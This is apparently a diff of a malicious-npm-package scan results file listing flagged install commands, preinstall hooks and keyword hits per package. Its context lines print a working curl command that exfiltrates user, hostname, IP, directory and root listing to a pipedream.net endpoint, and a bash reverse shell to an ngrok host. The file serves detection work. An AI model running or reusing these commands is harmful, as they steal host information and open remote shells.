@@ -2261,3 +2261,25 @@ CommandNode(parts=[WordNode(parts=[] pos=(13, 17) word='curl'), WordNode(parts=[
 CommandNode(parts=[WordNode(parts=[] pos=(12, 16) word='curl'), WordNode(parts=[] pos=(17, 19) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(27, 33) word='whoami')] pos=(27, 33)), PipeNode(pipe='|' pos=(34, 35)), CommandNode(parts=[WordNode(parts=[] pos=(36, 42) word='base64')] pos=(36, 42)), PipeNode(pipe='|' pos=(43, 44)), CommandNode(parts=[WordNode(parts=[] pos=(45, 51) word='base64')] pos=(45, 51))] pos=(27, 51)) pos=(25, 52))] pos=(20, 54) word='h1: $(whoami | base64 | base64 )'), WordNode(parts=[] pos=(55, 57) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(65, 73) word='hostname'), WordNode(parts=[] pos=(74, 76) word='-I')] pos=(65, 76)), PipeNode(pipe='|' pos=(77, 78)), CommandNode(parts=[WordNode(parts=[] pos=(79, 85) word='base64')] pos=(79, 85)), PipeNode(pipe='|' pos=(86, 87)), CommandNode(parts=[WordNode(parts=[] pos=(88, 94) word='base64')] pos=(88, 94)), PipeNode(pipe='|' pos=(95, 96)), CommandNode(parts=[WordNode(parts=[] pos=(97, 99) word='tr'), WordNode(parts=[] pos=(100, 102) word='-d'), WordNode(parts=[] pos=(103, 107) word='\\n')] pos=(97, 107))] pos=(65, 107)) pos=(63, 108))] pos=(58, 109) word="h2: $(hostname -I | base64 | base64 | tr -d '\\n')"), WordNode(parts=[] pos=(110, 112) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(120, 123) word='pwd')] pos=(120, 123)), PipeNode(pipe='|' pos=(124, 125)), CommandNode(parts=[WordNode(parts=[] pos=(126, 132) word='base64')] pos=(126, 132)), PipeNode(pipe='|' pos=(133, 134)), CommandNode(parts=[WordNode(parts=[] pos=(135, 141) word='base64')] pos=(135, 141))] pos=(120, 141)) pos=(118, 142))] pos=(113, 143) word='h3: $(pwd | base64 | base64)'), WordNode(parts=[] pos=(144, 146) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(154, 162) word='hostname')] pos=(154, 162)), PipeNode(pipe='|' pos=(163, 164)), CommandNode(parts=[WordNode(parts=[] pos=(165, 171) word='base64')] pos=(165, 171)), PipeNode(pipe='|' pos=(172, 173)), CommandNode(parts=[WordNode(parts=[] pos=(174, 180) word='base64')] pos=(174, 180)), PipeNode(pipe='|' pos=(181, 182)), CommandNode(parts=[WordNode(parts=[] pos=(183, 185) word='tr'), WordNode(parts=[] pos=(186, 188) word='-d'), WordNode(parts=[] pos=(189, 193) word='\\n')] pos=(183, 193))] pos=(154, 193)) pos=(152, 194))] pos=(147, 195) word="h4: $(hostname | base64 | base64 | tr -d '\\n')"), WordNode(parts=[] pos=(197, 199) word='-H'), WordNode(parts=[CommandsubstitutionNode(command=PipelineNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(207, 209) word='ls'), WordNode(parts=[] pos=(210, 211) word='/')] pos=(207, 211)), PipeNode(pipe='|' pos=(212, 213)), CommandNode(parts=[WordNode(parts=[] pos=(214, 220) word='base64')] pos=(214, 220)), PipeNode(pipe='|' pos=(221, 222)), CommandNode(parts=[WordNode(parts=[] pos=(223, 229) word='base64')] pos=(223, 229)), PipeNode(pipe='|' pos=(230, 231)), CommandNode(parts=[WordNode(parts=[] pos=(232, 234) word='tr'), WordNode(parts=[] pos=(235, 237) word='-d'), WordNode(parts=[] pos=(238, 242) word='\\n')] pos=(232, 242))] pos=(207, 242)) pos=(205, 243))] pos=(200, 244) word="h5: $(ls / | base64 | base64 | tr -d '\\n')"), WordNode(parts=[] pos=(246, 302) word='https://91d105265257dcee7429b373efe8b505.m.pipedream.net')] pos=(12, 302)),n-messaging-client-99999.4.0,1
 bash -i >& /dev/tcp/tcp.in.ngrok.io/17353 0>&1,puppeteer-example-0.1.4,1
 bash -i >& /dev/tcp/tcp.in.ngrok.io/17353 0>&1,puppeteer-example-0.1.4,1
+node core.js,amap-core-2.0.1,1
+Found 'sh' in shell.js,amap-core-2.0.1,1
+Found 'sh' in merged.js,amap-core-2.0.1,1
+Found 'sh' in core.js,amap-core-2.0.1,1
+Found 'sh' in index.js,amap-core-2.0.1,1
+Found 'sh' in merged.js,all-paths-1.0.2,1
+node index.js,a11y-test-app-1.0.0,1
+node app.js,account-settings-35.0.0,1
+node app.js,account-statement-35.0.0,1
+node index.js,act-rules.github.io-1.0.10,1
+Found 'sh' in merged.js,act-rules.github.io-1.0.10,1
+Found 'sh' in index.js,act-rules.github.io-1.0.10,1
+Found 'sh' in merged.js,all-paths-1.0.2,1
+semantic-release pre && npm publish && semantic-release post,am-i-a-dependency-1.1.2,1
+Found 'node' in merged.js,am-i-a-dependency-1.1.2,1
+semantic-release pre && npm publish && semantic-release post,app-root-path-3.1.0,1
+preinstall: node index.js,act-rules.github.io-1.0.10,1
+preinstall: node index.js,a11y-test-app-1.0.0,1
+preinstall: node index.js,act-rules.github.io-1.0.10,1
+preinstall: node app.js,account-settings-35.0.0,1
+preinstall: node app.js,account-statement-35.0.0,1
+preinstall: node index.js,act-rules.github.io-1.0.10,1
